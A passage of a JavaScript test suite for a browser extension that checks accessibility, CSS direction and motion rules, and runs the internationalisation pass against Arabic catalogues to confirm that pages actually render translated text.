      for (const m of code.matchAll(new RegExp('\\belText\\([^,()]*,\\s*' + JS_STR + '\\s*\\)', 'g'))) {
        const lit = litAt(m, 1);
        if (lit !== undefined && HAS_LETTER.test(lit)) badSink.push(file + ': elText(…, ' + JSON.stringify(lit) + ')');
      }
      /* skConfirm({ title, body, confirm, cancel }) — four user-visible strings
         at once, and the one destructive-action dialogue the user reads before
         saying yes. It was in no sink list at all: every field could be an
         English sentence with the whole tier green. The object literal is flat
         by construction, so one non-nested {…} is the whole argument. */
      for (const call of code.matchAll(/\bskConfirm\(\s*\{([^{}]*)\}/g)) {
        for (const m of call[1].matchAll(new RegExp('\\b(title|body|confirm|cancel)\\s*:\\s*' + JS_STR, 'g'))) {
          const lit = litAt(m, 2);
          if (lit !== undefined && HAS_LETTER.test(lit) && !EN[lit]) {
            badSink.push(file + ': skConfirm({ ' + m[1] + ': ' + JSON.stringify(lit) + ' })');
          }
        }
      }
    }
    check('every string handed to a text sink is a catalogue key, never a sentence',
      badSink.length === 0,
      badSink.slice(0, 6).join(' | ') ||
        'skToast/skMsg/elText/skConfirm all carry keys — in every quote style');

    /* ---- CSS: focus, motion, forced colours, direction, truncation ---- */
    const CSS = shippedStylesheets();
    const RAW_CSS = shippedStylesheets(true);   // comments intact: the physical-property escape hatch lives in one
    const COMMON = CSS.get('pages/common.css') || '';

    check('a :focus-visible rule exists in the shared stylesheet',
      /:focus-visible\s*\{/.test(COMMON) && /outline:\s*2px/.test(COMMON),
      'the ring is defined once, for every control');
    check('the base focus rule uses :where() so an author selector cannot out-specify it away',
      /:where\([^)]*\):focus-visible/.test(COMMON), 'zero-specificity base rule');

    const killsOutline = [];
    for (const [name, text] of CSS) {
      if (!/outline:\s*(none|0)\b/.test(text)) continue;
      if (!/:focus-visible/.test(text)) killsOutline.push(name);
    }
    check('no stylesheet removes an outline without defining a :focus-visible ring in the same file',
      killsOutline.length === 0, killsOutline.join(', ') || 'none removes it');

    const rm = /@media\s*\(prefers-reduced-motion:\s*reduce\)\s*\{([\s\S]*?)\n\}/.exec(COMMON);
    const rmBody = rm ? rm[1] : '';
    check('the reduced-motion block exists', !!rm, rm ? 'found' : 'absent');
    check('reduced motion covers PSEUDO-ELEMENTS (`*` does not match ::before/::after)',
      /\*::before/.test(rmBody) && /\*::after/.test(rmBody), rmBody.split('\n')[1] || 'no selector');
    check('reduced motion stops an INFINITE animation instead of speeding it to a strobe',
      /animation-iteration-count:\s*1\s*!important/.test(rmBody), 'animation-iteration-count: 1');
    check('reduced motion also flattens transitions and smooth scrolling',
      /transition-duration:\s*\.01ms\s*!important/.test(rmBody) &&
      /scroll-behavior:\s*auto\s*!important/.test(rmBody), 'all four declarations present');

    check('a forced-colors block exists (Windows High Contrast is the most-used OS a11y feature)',
      /@media\s*\(forced-colors:\s*active\)/.test(COMMON), 'declared');
    check('the switch restates its ON state in system colours under forced colours',
      /@media\s*\(forced-colors:\s*active\)[\s\S]*\.switch:checked\s*\{[^}]*Highlight/.test(COMMON),
      'Highlight / HighlightText');
    check('no stylesheet opts a control out of the user\'s forced-colors palette',
      !/forced-color-adjust:\s*none/.test(Array.from(CSS.values()).join('\n')), 'no forced-color-adjust: none');

    check('.text-untrusted isolates bidi (a title carrying U+202E must not reverse the origin next to it)',
      /\.text-untrusted\s*\{[^}]*unicode-bidi:\s*isolate/.test(COMMON), 'unicode-bidi: isolate');
    check('common.js ships elUntrusted(), which emits a <bdi> so the isolation survives a stylesheet edit',
      /function elUntrusted\([\s\S]{0,200}el\('bdi'/.test(H.readRoot('pages/common.js')), '<bdi>');

    /* Logical properties. The toggle-knob direction bug is the canonical one:
       invisible in every LTR test, in the shared settings pattern, and
       duplicated into every switch in the fleet. */
    const PHYSICAL = /(?:^|[\s;{])(margin-left|margin-right|padding-left|padding-right|border-left|border-right|border-top-left-radius|border-top-right-radius|border-bottom-left-radius|border-bottom-right-radius|left|right|float|clear|direction|text-align)\s*:/;
    const physical = [], unexplained = [];
    for (const [name, text] of CSS) {
      const lines = text.split('\n');
      const rawLines = String(RAW_CSS.get(name) || '').split('\n');
      for (let i = 0; i < lines.length; i++) {
        if (!PHYSICAL.test(lines[i])) continue;
        /* The escape hatch is read from the ORIGINAL line, because that is
           where the comment tagging it lives. */
        const raw = rawLines[i] || '';
        if (/physical: intentional/.test(raw)) {
          /* And the hatch has to SAY WHY on the same line. A bare tag is a
             silencer: it costs one word, it is the obvious move for anyone
             whose build just went red, and it leaves the next reader with no
             way to tell a deliberate LTR pane from a mirroring bug that was
             shouted down. */
          if (!/physical: intentional\s*[—-]\s*\S/.test(raw)) unexplained.push(name + ':' + (i + 1));
          continue;
        }
        physical.push(name + ':' + (i + 1) + ' ' + lines[i].trim().slice(0, 60));
      }
    }
    check('no stylesheet uses a physical inline-axis property without tagging it /* physical: intentional */',
      physical.length === 0, physical.slice(0, 5).join(' | ') || 'logical properties throughout');
    check('and every one of those tags states WHY, on the same line',
      unexplained.length === 0,
      unexplained.join(' | ') || 'the only hatch in the tree is the JSON preview pane, and it says so');
    check('the switch knob travels the other way in RTL',
      /\[dir="rtl"\]\s*\.switch:checked::after\s*\{[^}]*translateX\(-18px\)/.test(COMMON),
      'the one bug no LTR test can see');
    check('RTL drops letter-spacing and text-transform (they break joined Arabic letterforms)',
      /\[dir="rtl"\][\s\S]{0,200}letter-spacing:\s*normal/.test(COMMON), 'declared');

    /* Silent truncation: a box that clips its own overflow and caps its height
       throws content away with no scrollbar and no indicator, so nobody ever
       reports it. */
    const clipping = [];
    for (const [name, text] of CSS) {
      const re = /\{([^}]*)\}/g;
      let m;
      while ((m = re.exec(text))) {
        const body = m[1];
        if (!/overflow(-y)?:\s*hidden/.test(body)) continue;
        if (!/max-(height|block-size):/.test(body)) continue;
        if (/text-overflow:\s*ellipsis/.test(body)) continue;   // clipped, but VISIBLY
        clipping.push(name + ' { ' + body.trim().replace(/\s+/g, ' ').slice(0, 70) + ' }');
      }
    }
    check('nothing caps its height AND hides the overflow (content vanishes with no indicator)',
      clipping.length === 0, clipping.join(' | ') || 'nothing clips silently');

    const noWrap = [];
    for (const [name, text] of CSS) {
      const re = /([^{}]+)\{([^}]*)\}/g;
      let m;
      while ((m = re.exec(text))) {
        if (!/display:\s*flex/.test(m[2])) continue;
        if (/flex-wrap:/.test(m[2])) continue;
        noWrap.push(name + ' ' + m[1].trim().replace(/\s+/g, ' ').slice(0, 40));
      }
    }
    check('every flex row states its flex-wrap (a 60%-longer German label must have somewhere to go)',
      noWrap.length === 0, noWrap.join(' | ') || 'every display:flex declares it');

    /* ---- NO DEAD RULES ----
       A template carrying an unused rule teaches 67 tools to carry it too, and
       an unused rule is specifically dangerous here for two reasons: it is
       usually a SECOND definition of something that already exists (`.card`
       duplicated `.section` exactly, and `select.ctl` duplicated `.opt select`),
       which gives the family look a second place to drift from; and the copy
       nobody uses is the copy nobody updates.

       Worse than either is a rule guarding a class that does not exist at all —
       `[dir="rtl"] .eyebrow` READ as RTL coverage and provided none, which is
       worse than an omission because it stops anyone looking.

       Exemptions are declared, with a reason, not inferred. */
    const CSS_EXEMPT = new Map([
      ['spin', 'the reduced-motion exemplar: an infinite animation is what animation-iteration-count:1 exists for, and the browser tier grades it'],
      ['show', 'a state class set from JS (skToast, #saveNote), never present in the markup'],
      ['danger', 'a modifier applied by skConfirm({danger}) at run time'],
      ['sk-preview', 'built by skConfirm({previewText}), which exists in no HTML file'],
      ['sk-dialog', 'built by skConfirm'],
      ['text-untrusted', 'applied by elUntrusted() at run time'],
      ['row', 'built by skConfirm for its button row']
    ]);
    const declared = new Set();
    for (const [, text] of CSS) {
      for (const m of text.matchAll(/\.([a-zA-Z][\w-]*)/g)) declared.add(m[1]);
    }
    let markup = '';
    for (const [, src] of H.readShipped(['.html'])) markup += '\n' + src;
    let script = '';
    for (const [, src] of H.readShipped(['.js'])) script += '\n' + src;
    const usedSomewhere = (cls) =>
      new RegExp('class\\s*=\\s*["\'][^"\']*\\b' + cls + '\\b').test(markup) ||
      new RegExp('[\'"`][^\'"`]*\\b' + cls + '\\b[^\'"`]*[\'"`]').test(script);
    const orphanRules = [...declared]
      .filter(c => !CSS_EXEMPT.has(c) && !usedSomewhere(c))
      .sort();
    check('every class a stylesheet styles is actually used by a page or built by a script',
      orphanRules.length === 0,
      orphanRules.length
        ? 'STYLED BUT NEVER USED: ' + orphanRules.join(' ') +
          ' — delete the rule, or add it to CSS_EXEMPT with the reason it is applied at run time'
        : declared.size + ' classes, ' + CSS_EXEMPT.size + ' exempt with a stated reason');
    const staleExempt = [...CSS_EXEMPT.keys()].filter(c => !declared.has(c));
    check('and the exemption list itself has not gone stale',
      staleExempt.length === 0,
      staleExempt.length ? 'EXEMPTED BUT NO LONGER STYLED: ' + staleExempt.join(' ') : 'every exemption still names a real rule');

    /* ---- runtime ---- */
    const chrome = H.makeChrome({
      tabs: [{ id: 1, windowId: 1, active: true, title: 'Ordinary Page', url: 'https://example.com/a' }]
    });
    const bg = H.loadBackground({ chrome });
    const dom = H.makeDom({ html: ['popup/popup.html'] });
    const page = H.loadPage(['lib/settings.js', 'pages/common.js', 'popup/popup.js'],
      { chrome, idb: bg.idb, dom });
    await tick(12);

    /* THE CHECK THAT PROVES THE HARNESS ITSELF. Before the fake DOM understood
       attribute selectors, querySelectorAll('[data-i18n]') returned an EMPTY
       LIST — so an applier that translated nothing looked exactly like one that
       worked, and every i18n and a11y assertion downstream was green over
       nothing. Asserting a POSITIVE count is what makes the rest honest. */
    const applied = page.eval('skApplyI18n()');
    check('skApplyI18n actually found and filled the page\'s [data-i18n] nodes',
      applied >= 8, applied + ' attributes applied');
    check('no key the page asked for is missing from the catalogue',
      chrome.__i18nMissing().length === 0,
      chrome.__i18nMissing().join(', ') || chrome.__i18nAsked.length + ' lookups, all resolved');
    check('no ⟦missing-key⟧ marker survived anywhere in the rendered popup',
      dom.body.textContent.indexOf('⟦') < 0, dom.body.textContent.slice(0, 60));

    check('the popup sets lang and dir on <html> at boot',
      dom.documentElement.lang === 'en' && dom.documentElement.dir === 'ltr',
      'lang=' + dom.documentElement.lang + ' dir=' + dom.documentElement.dir);

    const divClicks = dom.events.filter(e => e.type === 'click' && ['DIV', 'SPAN', 'LI', 'P'].indexOf(e.tag) >= 0);
    check('no click handler is bound to a div or a span — every clickable thing is a real control',
      divClicks.length === 0, divClicks.map(e => e.tag + '#' + e.id).join(', ') || 'buttons and links only');

    page.sandbox.renderInfo({ ok: false, error: 'reasonBusy' });
    check('the error surface is announced (role=alert) and only its hidden state is toggled',
      dom.$('err').getAttribute('role') === 'alert' && dom.$('err').hidden === false,
      'role=' + dom.$('err').getAttribute('role'));
    /* Escape dismisses the dismissible thing. One listener, on the document, so
       a tool that adds a second dismissible surface extends that branch rather
       than adding a second key handler that fights it. */
    check('exactly one document-level keydown listener owns Escape',
      dom.docListeners('keydown') === 1, dom.docListeners('keydown') + ' listener(s)');
    dom.fireDoc('keydown', { key: 'Escape' });
    await tick(4);
    check('Escape dismisses the error note', dom.$('err').hidden === true,
      'hidden=' + dom.$('err').hidden);
    check('dismissing also deletes the parked note, so it does not come back',
      !chrome.storage.session.__data.has('skLastError'),
      chrome.storage.session.__data.size + ' session keys');
  });

  /* ---------------------------------------------------------------- */
  /* i18n — THE PASS ITSELF, EXECUTED                                  */
  /* ---------------------------------------------------------------- */
  /* EVERY i18n CHECK ABOVE THIS ONE READS THE PAGE. None of them RUNS it.

     That distinction is the whole reason this section exists. This item has
     been reported done twice by an author who had wired the DIRECTION
     attributes and spelled the keys into the markup, and both times the pages
     still rendered English. A grep proves a key is SPELLED. It cannot prove a
     string was FETCHED and PUT somewhere a user can see, and the difference
     between those two is the entire feature.

     So: the real pages/common.js, in a vm, against the real _locales files,
     over a DOM built out of the real markup, and the assertion is on
     textContent AFTER the boot pass has run. Arabic is the fixture because it
     is the locale the browser tier already proves end to end, and because "the
     text changed" is unfalsifiable in a locale whose strings equal English's.

     THE THREE NEAR-MISSES THIS SECTION IS SHAPED AROUND:
       1. @@bidi_dir and @@ui_locale are chrome.i18n lookups that succeed
          against a catalogue that does not exist. A page can ask for both, set
          lang and dir perfectly, and never touch a message file. They are
          excluded from the reach count BY NAME — they are exactly what the
          failed attempt wired before reporting done.
       2. A page that does not LOAD the pass renders the authored English with
          data-i18n attributes all over it, and every static check stays green
          because the markup is perfect. Caught by following each page's
          <script src> to a file that actually defines the pass.
       3. A translated locale makes "textContent equals the catalogue" strong
          and "textContent differs from English" strong; an UNtranslated one
          (a tool mid-specialisation, before its locales are filled in) makes
          both vacuous, because the two strings are the same. The probe nodes
          below carry a real key over deliberately impossible authored text, so
          the pass has to have run whatever the locale says. */
  await runSection('i18n', async () => {
    const PAGES = Array.from(H.readShipped(['.html']).entries());
    const EN = JSON.parse(H.readRoot('_locales/en/messages.json'));
    const AR = JSON.parse(H.readRoot('_locales/ar/messages.json'));
    check('the i18n scan found every shipped page and both catalogues it grades against',
      PAGES.length >= 2 && Object.keys(EN).length > 50 && Object.keys(AR).length > 50,
      PAGES.map(p => p[0]).join(' ') + ' · en=' + Object.keys(EN).length + ' ar=' + Object.keys(AR).length);

    /* ---- 1. does the page LOAD a pass at all? ---- */
    /* The reference paid for this one: a popup that does not include
       common.js renders every authored fallback, in English, with the keys
       sitting unread in the attributes. Follow the <script src> chain from
       each page to a file that DEFINES the pass — not one that merely mentions
       it, which is what a grep over the page would settle for. */
    const DEFINES_PASS = /function\s+skApplyI18n\s*\(/;
    const noPass = [];
    for (const [file, raw] of PAGES) {
      const html = stripHtmlComments(raw);
      const keyed = H.parseElements(html)
        .filter(e => e.attrs.has('data-i18n') || e.attrs.has('data-i18n-attr'));
      if (!keyed.length) continue;
      const dir = path.posix.dirname(file);
      let loads = null;
      for (const m of html.matchAll(/<script\b[^>]*\bsrc\s*=\s*"([^"]+)"/g)) {
        const rel = path.posix.normalize(path.posix.join(dir, m[1]));
        let src = '';
        try { src = H.readRoot(rel); } catch (_) { continue; }
        if (DEFINES_PASS.test(src)) loads = rel;
      }
      /* A page may also carry its OWN copy — that is the correct answer for a
         page that deliberately loads no shared script, and the wrong answer is
         to have neither. */
      if (!loads && DEFINES_PASS.test(html)) loads = 'its own inline copy';
      if (!loads) noPass.push(file + ' — ' + keyed.length + ' keyed element(s), no applier');
    }
    check('every page that carries message keys also LOADS the pass that fills them',
      noPass.length === 0,
      noPass.join(' | ') ||
        'a page with keys and no applier renders the authored English and grades green');

    /* ---- 2. the attribute allowlist, read from the shipped file ---- */
    /* Not re-declared here. The array under test is the one the browser uses,
       pulled out of the running module, because a second copy in the test is
       a copy that agrees with itself while the product does something else. */
    const dom0 = H.makeDom({});
    const probe = H.loadPage(['lib/settings.js', 'pages/common.js'],
      { chrome: H.makeChrome({ uiLanguage: 'ar', catalogueLocale: 'ar', bidiDir: 'rtl' }), dom: dom0 });
    const ALLOW = probe.eval('typeof SK_I18N_ATTRS === "undefined" ? null : SK_I18N_ATTRS');
    check('the pass exposes SK_I18N_ATTRS as a flat list of attribute NAMES',
      Array.isArray(ALLOW) && ALLOW.length > 0 && ALLOW.every(a => typeof a === 'string' && /^[a-z-]+$/.test(a)),
      Array.isArray(ALLOW) ? ALLOW.join(' ') : String(ALLOW));

    /* Every one of these turns a message file into something other than text.
       _locales/ is the part of a shipped extension a translator — or a
       translation service, or whoever sends the PR — edits, and it is reviewed
       as prose. href and formaction make it a navigation target; src and
       srcdoc make it a content source; style makes it a stylesheet; value
       makes it the stored enum behind a <select>, so translating one corrupts
       the user's settings rather than merely looking wrong. */
    const FORBIDDEN = ['href', 'src', 'srcdoc', 'srcset', 'action', 'formaction', 'style',
      'value', 'data', 'ping', 'background', 'poster', 'target', 'rel', 'id', 'class', 'name'];
    const admitted = Array.isArray(ALLOW)
      ? ALLOW.filter(a => FORBIDDEN.indexOf(String(a).toLowerCase()) >= 0 || /^on/i.test(String(a)))
      : ['(no allowlist)'];
    check('the allowlist admits no attribute that can navigate, execute, style or store',
      admitted.length === 0,
      admitted.length
        ? 'ADMITTED: ' + admitted.join(' ') + ' — a message file must only ever become TEXT'
        : ALLOW.length + ' names, all inert: ' + ALLOW.join(' '));

    /* ---- 2b. the keys JS names that no scan of a literal can see ---- */
    /* skPlural takes a BASE key and appends _<category> at run time. Neither
       half is a catalogue key on its own, so the "every literal handed to a
       text sink is a key" check cannot grade it: it sees 'dataStoredRows',
       finds no such message, and would be red on correct code — so it skips
       the shape entirely. This grades the family the way the browser resolves
       it, and it demands all six categories, because a locale that selects
       `few` and finds nothing falls back to _other, and a family with no
       _other has nothing to fall back TO. */
    const CATEGORIES = probe.eval('typeof SK_PLURAL_CATEGORIES === "undefined" ? null : SK_PLURAL_CATEGORIES');
    check('the pass declares the six CLDR plural categories, and the test reads THAT list',
      Array.isArray(CATEGORIES) && CATEGORIES.length === 6 && CATEGORIES.indexOf('other') >= 0,
      Array.isArray(CATEGORIES) ? CATEGORIES.join(' ') : String(CATEGORIES));
    const pluralSites = [], badPlural = [];
    for (const [file, src] of H.readShipped(['.js'])) {
      for (const m of stripJsComments(src).matchAll(/\bskPlural\(\s*'([^']+)'/g)) {
        pluralSites.push(file + ': ' + m[1]);
        for (const cat of (CATEGORIES || [])) {
          if (!EN[m[1] + '_' + cat]) badPlural.push(m[1] + '_' + cat);
        }
      }
    }
    check('the plural scan found the call sites it grades', pluralSites.length > 0,
      pluralSites.join(' | ') || 'NO skPlural CALL SITE — this check is grading nothing');
    check('every skPlural family declares all six categories in _locales/en',
      badPlural.length === 0,
      Array.from(new Set(badPlural)).join(' ') || pluralSites.length + ' family(ies), six forms each');

    /* ---- 2c. the JS spelling of the ATTRIBUTE half ---- */
    /* `=== a11y ===` grades the literals handed to elText/skToast/skMsg. This
       is the same bug through the other door, and it is the door accessibility
       work walks through: a row built at run time gets
       setAttribute('aria-label', 'Delete the row from example.com') because
       that is the line that makes the screen reader correct, and it ships to
       55 locales in English with the page around it perfectly translated.
       options.js already does this right — skMsg('rowDeleteLabel', [origin]) —
       and now it has to stay right. */
    const attrSinks = [];
    for (const [file, src] of H.readShipped(['.js'])) {
      const code = stripJsComments(src);
      const named = '(title|aria-label|aria-description|aria-placeholder|aria-roledescription|aria-valuetext|placeholder|alt|label)';
      /* Same three-quote rule as the text sinks above, and for the same reason:
         .title = "Dismiss" is the bug, and a single-quote-only pattern calls it
         clean. JS_STR is defined in `=== a11y ===`, which runs first. */
      for (const m of code.matchAll(new RegExp('setAttribute\\(\\s*[\'"`]' + named + '[\'"`]\\s*,\\s*' + JS_STR, 'g'))) {
        const lit = litAt(m, 2);
        if (lit !== undefined && HAS_LETTER.test(lit)) attrSinks.push(file + ": setAttribute('" + m[1] + "', " + JSON.stringify(lit) + ')');
      }
      for (const m of code.matchAll(new RegExp('\\.(title|ariaLabel|ariaDescription|placeholder|alt)\\s*=\\s*' + JS_STR, 'g'))) {
        const lit = litAt(m, 2);
        if (lit !== undefined && HAS_LETTER.test(lit)) attrSinks.push(file + ': .' + m[1] + ' = ' + JSON.stringify(lit));
      }
    }
    check('no shipped script writes an accessible name or a tooltip as an English literal',
      attrSinks.length === 0,
      attrSinks.slice(0, 4).join(' | ') ||
        'every run-time name comes from skMsg — the markup half is data-i18n-attr');

    /* ---- 3. the pass, EXECUTED, per page, in Arabic ---- */
    /* One boot per page. The DOM is built from that page's own markup — every
       element the file marks up, carrying the authored English it ships — so
       the thing under test is the product's own key list, not a fixture that
       can drift away from it. */
    const IMPOSSIBLE = 'GATE-SENTINEL-THE-PASS-DID-NOT-RUN';
    for (const [file, raw] of PAGES) {
      const html = stripHtmlComments(raw);
      const specs = H.parseElements(html)
        .filter(e => e.attrs.has('data-i18n') || e.attrs.has('data-i18n-attr'));
      if (!specs.length) continue;

      const dom = H.makeDom({});
      const chrome = H.makeChrome({ uiLanguage: 'ar', catalogueLocale: 'ar', bidiDir: 'rtl' });
      const seeded = [];
      for (const spec of specs) {
        const node = dom.document.createElement(spec.tag);
        for (const [name, value] of spec.attrs) node.setAttribute(name, value);
        node.textContent = spec.text;
        dom.body.appendChild(node);
        seeded.push({ spec, node, english: spec.text });
      }
      /* Probe A: a real key over text that is in no catalogue in any language.
         If the pass did not run, this survives — and it survives in a tool
         whose ar file is still English, where every other assertion here would
         be true of a page that rendered nothing at all. */
      const probeKey = specs.map(s => s.attrs.get('data-i18n')).find(k => k && AR[k] && !AR[k].placeholders);
      const probeNode = dom.document.createElement('span');
      probeNode.setAttribute('data-i18n', probeKey || '');
      probeNode.textContent = IMPOSSIBLE;
      dom.body.appendChild(probeNode);

      const page = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom });
      await tick(6);

      check(file + ': the boot pass replaced the authored text with the catalogue\'s',
        !!probeKey && probeNode.textContent === AR[probeKey].message,
        probeKey ? 'want "' + (AR[probeKey] || {}).message + '" · got "' + probeNode.textContent + '"'
                 : 'no placeholder-free key in this page to probe with');

      const wrongText = [], wrongAttr = [], stillEnglish = [];
      let translatable = 0, attrsWritten = 0;
      for (const { spec, node, english } of seeded) {
        const key = spec.attrs.get('data-i18n');
        if (key && AR[key] && !AR[key].placeholders) {
          const want = AR[key].message;
          if (node.textContent !== want) wrongText.push(key + ': got "' + node.textContent + '"');
          /* The catalogue itself says whether this string HAS a translation:
             a brand name is the same in ar as in en and proves nothing either
             way. Only the ones that differ are counted, and then every single
             one of them must have changed on screen — no threshold, no
             fraction, nothing to argue with. */
          if (EN[key] && AR[key].message !== EN[key].message) {
            translatable++;
            if (String(node.textContent).replace(/\s+/g, ' ').trim() ===
                String(english).replace(/\s+/g, ' ').trim()) stillEnglish.push(key);
          }
        }
        for (const [name, k] of parseI18nAttrSpec(spec.attrs.get('data-i18n-attr'))) {
          if (!AR[k]) continue;
          attrsWritten++;
          if (node.getAttribute(name) !== AR[k].message) {
            wrongAttr.push(name + ':' + k + ' got "' + node.getAttribute(name) + '"');
          }
        }
      }
      check(file + ': every [data-i18n] node holds its Arabic message in textContent',
        wrongText.length === 0,
        wrongText.slice(0, 3).join(' | ') || seeded.length + ' nodes, all filled from _locales/ar');
      check(file + ': every allowlisted attribute was written too, and written from the catalogue',
        attrsWritten > 0 && wrongAttr.length === 0,
        wrongAttr.slice(0, 3).join(' | ') || attrsWritten + ' attribute(s) filled from _locales/ar');

      /* Every string the ar catalogue actually translates must READ DIFFERENTLY
         on screen than the English in the markup. This is the assertion the
         failed attempt would have died on: it had marked up the keys and wired
         the direction, and the page still said "Options".
         A tool mid-specialisation may have locales that are still English —
         then `translatable` is 0 and this is vacuous, which is why the skeleton
         (where it is 120 of 124) additionally asserts it is not. */
      check(file + ': and every string ar translates now READS as Arabic, not as the authored English',
        stillEnglish.length === 0,
        stillEnglish.slice(0, 3).join(' ') ||
          translatable + ' translated string(s) on this page, none still showing English');
      if (isSkeletonTree()) {
        check(file + ': (and the skeleton\'s ar catalogue really does translate them, so that was not vacuous)',
          translatable >= 4, translatable + ' of ' + seeded.length + ' seeded nodes differ from en in ar');
      }

      /* ---- 4. the page REACHED the message files ---- */
      /* @@bidi_dir and @@ui_locale resolve without a catalogue. Counting them
         is how an attempt that wired direction and nothing else reported
         itself done, so they are subtracted BY NAME and the remainder has to
         be non-empty on its own. */
      const asked = chrome.__i18nAsked.slice();
      const predefined = asked.filter(k => k.slice(0, 2) === '@@');
      const real = asked.filter(k => k.slice(0, 2) !== '@@' && AR[k]);
      check(file + ': reached the MESSAGE FILES — @@bidi_dir and @@ui_locale do not count',
        real.length > 0,
        real.length + ' message key(s) resolved, ' + predefined.length + ' @@ lookup(s) excluded (' +
          Array.from(new Set(predefined)).join(' ') + ')');
      check(file + ': no key the page asked for is missing from the Arabic catalogue',
        chrome.__i18nMissing().length === 0,
        Array.from(new Set(chrome.__i18nMissing())).join(', ') || real.length + ' lookups, all resolved');
      check(file + ': the boot pass also set lang and dir from the same locale',
        dom.documentElement.dir === 'rtl' && /^ar/.test(String(dom.documentElement.lang)),
        'lang=' + dom.documentElement.lang + ' dir=' + dom.documentElement.dir);
      void page;
    }

    /* ---- 5. what the pass does when the key is NOT there ---- */
    /* The failure mode being bought off: a tool author adds a control, marks
       it up, and forgets the catalogue entry. Overwriting the authored English
       with '' — or with a marker — turns one missing translation into an
       unusable control, in EVERY locale, including the author's own. The miss
       must degrade to English and warn, never to blank. */
    {
      const dom = H.makeDom({});
      const chrome = H.makeChrome({ uiLanguage: 'ar', catalogueLocale: 'ar', bidiDir: 'rtl' });
      const miss = dom.document.createElement('p');
      miss.setAttribute('data-i18n', 'skKeyThatIsInNoCatalogue');
      miss.textContent = 'Authored English, still standing';
      dom.body.appendChild(miss);

      const missAttr = dom.document.createElement('button');
      missAttr.setAttribute('data-i18n-attr', 'title:skKeyThatIsInNoCatalogue');
      missAttr.setAttribute('title', 'Authored tooltip');
      dom.body.appendChild(missAttr);

      const page = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom });
      await tick(4);

      check('a missing key leaves the AUTHORED ENGLISH standing in textContent',
        miss.textContent === 'Authored English, still standing',
        'got "' + miss.textContent + '"');
      check('a missing key leaves the authored ATTRIBUTE standing too',
        missAttr.getAttribute('title') === 'Authored tooltip',
        'got "' + missAttr.getAttribute('title') + '"');
      check('and it says so — a silent miss is a translation gap nobody ever finds',
        /skKeyThatIsInNoCatalogue/.test(page.logText()) && /warn/.test(page.logText()),
        page.logs.filter(l => /skKeyThatIsInNoCatalogue/.test(l.text)).map(l => l.level).join(',') || 'nothing logged');
    }

    /* ---- 6. and what it does when the ATTRIBUTE is not allowed ---- */
    /* The allowlist has to be enforced where the write happens, not only
       declared at the top of the file. A tool author who adds
       data-i18n-attr="href:someKey" — or a translator who edits the markup of
       a page they were asked to localise — must get nothing at all. */
    {
      const dom = H.makeDom({});
      const chrome = H.makeChrome({ uiLanguage: 'ar', catalogueLocale: 'ar', bidiDir: 'rtl' });
      const link = dom.document.createElement('a');
      link.setAttribute('data-i18n-attr', 'href:optionsLink; title:optionsLink');
      link.setAttribute('href', '#stays');
      link.setAttribute('title', 'Authored tooltip');
      dom.body.appendChild(link);

      const page = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom });
      await tick(4);

      check('a forbidden attribute is REFUSED at the write, not merely undeclared',
        link.getAttribute('href') === '#stays',
        'href=' + link.getAttribute('href'));
      check('and the refusal is loud',
        /refusing to write attribute/.test(page.logText()) && /href/.test(page.logText()),
        page.logs.filter(l => /refusing/.test(l.text)).map(l => l.text).join(' | ') || 'nothing logged');
      check('the allowlisted pair on the SAME element still went through',
        link.getAttribute('title') === AR.optionsLink.message,
        'title=' + link.getAttribute('title'));
    }
  });

  /* ---------------------------------------------------------------- */
  /* locales — FINISHED WORK, OR ABANDONED WORK?                       */
  /* ---------------------------------------------------------------- */
  /* THIS SECTION EXISTS BECAUSE SHAPE CANNOT DETECT ABANDONMENT.
     In this family, 23 locale catalogues that were pure English passed, all
     green, every structural check there is: valid JSON, identical key sets,
     identical placeholder inventories, 55 codes declared in the manifest, the
     right file in the right directory. The extension shipped English to 23
     markets and every tier said ALL PASS.

     The only thing that can tell finished work from abandoned work is the
     VALUES. So this section reads what is actually in the files:
       * no two catalogues are byte-identical — the signature of copy-paste;
       * every locale differs from English in MOST of its values — the
         signature of a generator that fell back;
       * every non-Latin locale is written in its own script — the signature
         of a translation that was never done at all.

     WHY BYTE-IDENTITY ALONE IS NOT ENOUGH, and this is the one that cost the
     most: the 23 abandoned files were NOT byte-identical to en/messages.json.
     They were English CONTENT carrying different description annotations, so
     every byte comparison said "different" and meant nothing. The teeth probe
     for this section reproduces that exact shape — English content, stamps
     rewritten — because a probe that copies en/messages.json literally tests a
     failure mode that never happens.

     THE TWO EXEMPTIONS, both narrow, both printed rather than silent:
       1. the PASS-THROUGH keys — the product's own short name and any message
          with no letter in it (the em dash). Derived exactly as
          _locales/make-locales.mjs derives them, not listed here, so a tool
          that renames its brand does not have to edit this test.
       2. variants of the SOURCE language. en_GB is English; being 99%
          identical to en is what correct looks like. That exemption is for
          en only — zh_TW identical to zh_CN, or pt_PT to pt_BR, is an empty
          TM wearing a locale code, and is graded like everything else. */
  await runSection('locales', async () => {
    const LOC_DIR = path.join(H.ROOT, '_locales');
    const EN = JSON.parse(H.readRoot('_locales/en/messages.json'));
    const EN_KEYS = Object.keys(EN);
    const SOURCE = 'en';
    const baseOf = c => String(c).split('_')[0];

    const codes = fs.readdirSync(LOC_DIR, { withFileTypes: true })
      .filter(e => e.isDirectory())
      .map(e => e.name)
      .filter(n => fs.existsSync(path.join(LOC_DIR, n, 'messages.json')))
      .sort();

    const RAW = new Map();
    const CAT = new Map();
    const unparsable = [];
    for (const c of codes) {
      const text = fs.readFileSync(path.join(LOC_DIR, c, 'messages.json'), 'utf8');
      RAW.set(c, text);
      try { CAT.set(c, JSON.parse(text)); } catch (e) { unparsable.push(c + ': ' + e.message); }
    }

    /* The same derivation as the generator's passesThroughUntranslated(). */
    const BRAND = EN.appShortName && EN.appShortName.message;
    const passThrough = k => (BRAND && EN[k].message === BRAND) || !/\p{L}/u.test(EN[k].message);
    const GRADED = EN_KEYS.filter(k => !passThrough(k));
    const TRANSLATED_MIN = 0.90;     // of the graded values, per locale
    const SCRIPT_MIN = 0.90;         // of the graded values, per non-Latin locale

    /* ---- 0. the vacuity guard ---- */
    /* Every check below is an assertion about a SET. An empty set satisfies all
       of them, and "no locale failed" is the sentence a deleted _locales
       directory produces. */
    check('the locale scan found the catalogues, and they parse',
      codes.length >= 40 && unparsable.length === 0 && GRADED.length > 50 && CAT.size === codes.length,
      unparsable.join(' | ') || codes.length + ' locales · ' + EN_KEYS.length + ' keys (' +
        GRADED.length + ' graded, ' + (EN_KEYS.length - GRADED.length) + ' pass through: ' +
